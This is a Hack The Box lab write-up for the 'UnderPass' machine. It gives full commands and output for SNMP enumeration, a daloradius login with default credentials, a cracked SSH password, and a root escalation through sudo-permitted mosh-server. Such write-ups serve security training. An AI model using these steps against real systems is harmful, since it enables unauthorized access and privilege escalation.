# HTB UnderPass Writeup

![image.png](HTB%20UnderPass%20Writeup%20166b43b4a03c80cc8cc8f47846c9ed7a/image.png)

## Machine Info

[UnderPass](https://app.hackthebox.com/machines/UnderPass) is an "**easy**" difficulty Linux machine on Hack The Box (HTB). The machine features several vulnerabilities, including a misconfigured **SNMP** (Simple Network Management Protocol) service with a publicly accessible community string, which reveals sensitive information about the system. The machine also hosts a **daloradius** server, and through enumeration, we discover a GitHub repository containing information about a login page. By leveraging default credentials, we gain access to the system, retrieve a user password hash, and exploit the Mosh server to escalate privileges to root.

### Initial enumeration.

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- Upon accessing the website, the default Apache page is displayed, indicating that the web server is running but hasn't been configured with a custom site yet.

![image.png](HTB%20UnderPass%20Writeup%20166b43b4a03c80cc8cc8f47846c9ed7a/image%201.png)

- Neither of the fuzzing tools used, such as **ffuf** and **feroxbuster**, were able to find any directories or subdomains during enumeration.

```bash
~/HTB/Machines/UnderPass  ffuf -u <http://underpass.htb> -H 'Host: FUZZ.underpass.htb' -w ~/Tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -fs 10671

        /'___\\  /'___\\           /'___\\
       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/
         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\
          \\/_/    \\/_/   \\/___/    \\/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : <http://underpass.htb>
 :: Wordlist         : FUZZ: /Users/alam/Tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.underpass.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 10671
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 533 req/sec :: Duration: [0:00:12] :: Errors: 0 ::

```

```bash
~/HTB/Machines/UnderPass  feroxbuster -u <http://underpass.htb/> -w ~/tools/seclists/Discovery/Web-Content/raft-medium-directories.txt -r

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__
|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ <http://underpass.htb/>
 🚀  Threads               │ 50
 📖  Wordlist              │ /Users/alam/tools/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       22l      105w     5952c <http://underpass.htb/icons/ubuntu-logo.png>
200      GET      363l      961w    10671c <http://underpass.htb/>
[####################] - 53s    30005/30005   0s      found:2       errors:0
[####################] - 52s    30000/30000   577/s   <http://underpass.htb/>

```

### User flag

- Running an [Nmap](https://nmap.org/) scan for UDP ports reveals that port 161 is open, which corresponds to the SNMP service. After performing an `snmpwalk` query using the '**public**' community string, we uncover several interesting details, including the Fully Qualified Domain Name (FQDN) and the presence of a daloradius server.

```bash
~/HTB/Machines/UnderPass  **sudo nmap -sU -p-  10.10.11.48 --min-rate 10000**

Password:
Starting Nmap 7.95 ( <https://nmap.org> ) at 2024-12-23 16:41 IST
Warning: 10.10.11.48 giving up on port because retransmission cap hit (10).
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.072s latency).
Not shown: 65456 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT    STATE SERVICE
**161/udp open  snmp**

Nmap done: 1 IP address (1 host up) scanned in 72.72 seconds

```

```bash
~/HTB/Machines/UnderPass  **snmpwalk -v 2c -c public 10.10.11.48**

SNMPv2-MIB::sysDescr.0 = STRING: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (1600037) 4:26:40.37
SNMPv2-MIB::sysContact.0 = STRING: steve@underpass.htb
SNMPv2-MIB::sysName.0 = STRING: **UnDerPass.htb** is the only **daloradius** **server** in the basin!
.....snip.....
View (It is past the end of the MIB tree)

```

- Upon reviewing the **daloradius** server's [GitHub](https://github.com/lirantal/daloradius/blob/master/app/operators/login.php) repository, we discover that it includes a `login.php` page. A quick Google search reveals that the default credentials for the login are `administrator` for the username and `radius` for the password.

```bash
~/HTB/Machines/UnderPass  **feroxbuster -u <http://underpass.htb/daloradius/app/> -w ~/tools/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -n**

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__
|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ <http://underpass.htb/daloradius/app/>
 🚀  Threads               │ 50
 📖  Wordlist              │ /Users/alam/tools/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      330c <http://underpass.htb/daloradius/app/common> => <http://underpass.htb/daloradius/app/common/>
301      GET        9l       28w      329c <http://underpass.htb/daloradius/app/users> => <http://underpass.htb/daloradius/app/users/>
301      GET        9l       28w      333c <http://underpass.htb/daloradius/app/operators> => <http://underpass.htb/daloradius/app/operators/>
[####>---------------] - 2m     53684/220550  4m      found:3       errors:2
[##>-----------------] - 2m     26819/220545  289/s   <http://underpass.htb/daloradius/app/>
```

![image.png](HTB%20UnderPass%20Writeup%20166b43b4a03c80cc8cc8f47846c9ed7a/image%202.png)

![image.png](HTB%20UnderPass%20Writeup%20166b43b4a03c80cc8cc8f47846c9ed7a/image%203.png)

- After logging into the **daloradius** server, we discovered a set of user credentials. Using [CrackStation](https://crackstation.net/), we successfully cracked the password, revealing it to be '***underwaterfriends***’.

![image.png](HTB%20UnderPass%20Writeup%20166b43b4a03c80cc8cc8f47846c9ed7a/image%204.png)

- We were able to successfully SSH into the machine using the `svcMosh` user credentials and capture the `user.txt` flag."

```bash
~/HTB/Machines/UnderPass  ssh svcMosh@10.10.11.48
svcMosh@10.10.11.48's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
...snip....
Last login: Mon Dec 23 07:21:33 2024 from 127.0.0.1
svcMosh@underpass:~$ id
uid=1002(svcMosh) gid=1002(svcMosh) groups=1002(svcMosh)
svcMosh@underpass:~$ uname -a
Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
svcMosh@underpass:~$ cat user.txt
d9****************************46
```

### Privilege Escalation (Root)

- Running the `sudo -l` command reveals that the `svcMosh` user has permission to execute the `/usr/bin/mosh-server` binary as root.

```bash
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

- When I ran the binary, it produced the following output. Consulting [ChatGPT](https://chatgpt.com/) didn’t provide much insight, so I decided to perform a quick search using the phrase 'MOSH CONNECT 60001.' This led me to a [medium blog post](https://medium.com/@sunjizu/ssh-in-another-way-when-tcp-is-blocked-6742d7eeb550) that explained how to connect to the `mosh-server` using `mosh-client` and a key. Reviewing `mosh-server` and `mosh-client` man pages, which mentioned that the `MOSH CONNECT` command needs to be executed within 60 seconds. These man pages also provided further details on how to establish the connection.

```bash
~/HTB/Machines/UnderPass  man mosh-server

 mosh-server binds to a high UDP port and chooses an encryption key to protect the session. It prints both on standard output, detaches from the terminal, and waits for
       the mosh-client to establish a connection. It will exit if no client has contacted it within 60 seconds.
```

```bash
svcMosh@underpass:~$ sudo /usr/bin/mosh-server

MOSH CONNECT 60001 LCLxlRp2Rd+KvgCkaCp04A

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 4081]
```

![image.png](HTB%20UnderPass%20Writeup%20166b43b4a03c80cc8cc8f47846c9ed7a/image%205.png)

- Below is a snippet from the article screenshot, outlining the steps for how to connect..

![image.png](HTB%20UnderPass%20Writeup%20166b43b4a03c80cc8cc8f47846c9ed7a/image%206.png)

- After escalating my privileges to root, I was able to capture the `root.txt` flag.

```bash
svcMosh@underpass:/tmp$ sudo /usr/bin/mosh-server

MOSH CONNECT 60001 F9X8nyL/nbY5jxd8KUkI5g

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 2313]
svcMosh@underpass:/tmp$ MOSH_KEY=F9X8nyL/nbY5jxd8KUkI5g mosh-client 127.0.0.1 60001
[mosh is exiting.]

root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
root@underpass:~# uname -a
Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
root@underpass:~# cat root.txt | wc -c
33
```
